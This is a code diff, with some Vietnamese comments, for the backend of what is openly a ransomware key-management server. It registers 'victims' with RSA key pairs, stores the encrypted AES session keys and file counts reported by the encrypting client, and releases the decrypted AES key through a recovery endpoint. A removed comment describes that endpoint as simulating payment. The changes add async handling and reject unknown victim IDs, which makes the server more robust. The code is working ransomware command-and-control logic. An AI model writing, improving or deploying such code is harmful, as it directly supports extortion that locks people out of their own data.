@@ -1,28 +1,44 @@
 import { randomUUID, generateKeyPairSync, privateDecrypt, constants } from 'crypto';
 import db from '../config/db.js';
 
-// Helper: Create Victim Identity with RSA Keys
+// [FIX] Convert to Async Function returning a Promise
 export const createVictimIdentity = (ip) => {
-    const clientId = randomUUID();
-    console.log(`[Backend] Generating keys for: ${clientId}`);
-    
-    const { publicKey, privateKey } = generateKeyPairSync('rsa', {
-        modulusLength: 2048,
-        publicKeyEncoding: { type: 'spki', format: 'pem' },
-        privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
-    });
+    return new Promise((resolve, reject) => {
+        const clientId = randomUUID();
+        console.log(`[Backend] Generating keys for: ${clientId}`);
+        
+        const { publicKey, privateKey } = generateKeyPairSync('rsa', {
+            modulusLength: 2048,
+            publicKeyEncoding: { type: 'spki', format: 'pem' },
+            privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
+        });
 
-    db.run(
-        `INSERT OR IGNORE INTO victims (client_id, created_at, ip, private_key, public_key) VALUES (?, ?, ?, ?, ?)`,
-        [clientId, new Date().toISOString(), ip, privateKey, publicKey]
-    );
-    return { clientId, publicKey, privateKey };
+        // Wait for DB Insert
+        db.run(
+            `INSERT OR IGNORE INTO victims (client_id, created_at, ip, private_key, public_key) VALUES (?, ?, ?, ?, ?)`,
+            [clientId, new Date().toISOString(), ip, privateKey, publicKey],
+            (err) => {
+                if (err) {
+                    console.error("DB Insert Error:", err);
+                    reject(err);
+                } else {
+                    resolve({ clientId, publicKey, privateKey });
+                }
+            }
+        );
+    });
 };
 
-// Controller: New Victim Registration
-export const newVictim = (req, res) => {
-    const identity = createVictimIdentity(req.ip);
-    res.status(201).json({ clientId: identity.clientId, publicKey: identity.publicKey });
+// --- Controllers ---
+
+export const newVictim = async (req, res) => {
+    try {
+        // [FIX] Await the creation
+        const identity = await createVictimIdentity(req.ip);
+        res.status(201).json({ clientId: identity.clientId, publicKey: identity.publicKey });
+    } catch (error) {
+        res.status(500).json({ error: "Failed to generate identity" });
+    }
 };
 
 export const reportSessionKey = (req, res) => {
@@ -30,26 +46,38 @@ export const reportSessionKey = (req, res) => {
     
     if (!key || !clientId) return res.status(400).json({ error: 'Missing data' });
 
-    db.run(
-        `INSERT INTO session_keys (client_id, key, files_count, received_at, ip) VALUES (?, ?, ?, ?, ?)`,
-        [clientId, key, filesCount || 0, new Date().toISOString(), req.ip],
-        (err) => {
-            if (err) {
-                console.error(err);
-                return res.status(500).json({error: "DB Error"});
-            }
-            console.log(`[Backend] Key received for ${clientId}`);
-            res.status(201).json({ stored: true });
+    // [FIX] Kiểm tra xem Victim ID có tồn tại không trước khi lưu key
+    db.get('SELECT 1 FROM victims WHERE client_id = ?', [clientId], (err, row) => {
+        if (err) return res.status(500).json({ error: "DB Check Error" });
+        
+        if (!row) {
+            console.warn(`[Backend] Rejected key for unknown ID: ${clientId}`);
+            // Trả về 401 để Frontend biết đường reset
+            return res.status(401).json({ error: "Identity invalid or expired. Please reload." });
         }
-    );
+
+        // Nếu tồn tại thì mới lưu key
+        db.run(
+            `INSERT INTO session_keys (client_id, key, files_count, received_at, ip) VALUES (?, ?, ?, ?, ?)`,
+            [clientId, key, filesCount || 0, new Date().toISOString(), req.ip],
+            (err) => {
+                if (err) {
+                    console.error(err);
+                    return res.status(500).json({error: "DB Insert Error"});
+                }
+                console.log(`[Backend] Key received for ${clientId}`);
+                res.status(201).json({ stored: true });
+            }
+        );
+    });
 };
 
-// Controller: Recover Key (Simulates Payment & Key Retrieval)
 export const recoverKey = (req, res) => {
     const { clientId } = req.body;
     if (!clientId) return res.status(400).json({ error: 'Missing Client ID' });
 
     // 1. Find the latest session key and the victim's private key
+    // [NOTE] This JOIN requires the victim to exist in 'victims' table
     const query = `
         SELECT s.key as encrypted_aes, v.private_key 
         FROM session_keys s
@@ -60,10 +88,13 @@ export const recoverKey = (req, res) => {
 
     db.get(query, [clientId], (err, row) => {
         if (err) return res.status(500).json({ error: "Database error" });
-        if (!row) return res.status(404).json({ error: "No record found. Did you finish encryption?" });
+        // Log this for debugging
+        if (!row) {
+            console.log(`[Backend] Recovery failed for ${clientId}. No key found.`);
+            return res.status(404).json({ error: "No record found. Did you finish encryption?" });
+        }
 
         try {
-            // 2. Decrypt the AES key using the stored Private Key
             const privateKey = row.private_key;
             const encryptedBuffer = Buffer.from(row.encrypted_aes, 'base64');
 
@@ -77,7 +108,6 @@ export const recoverKey = (req, res) => {
 
             console.log(`[Backend] Recovering keys for ${clientId}`);
 
-            // 3. Send the RAW AES key back to the victim
             res.json({ 
                 success: true, 
                 key: rawAesKey.toString('base64'),
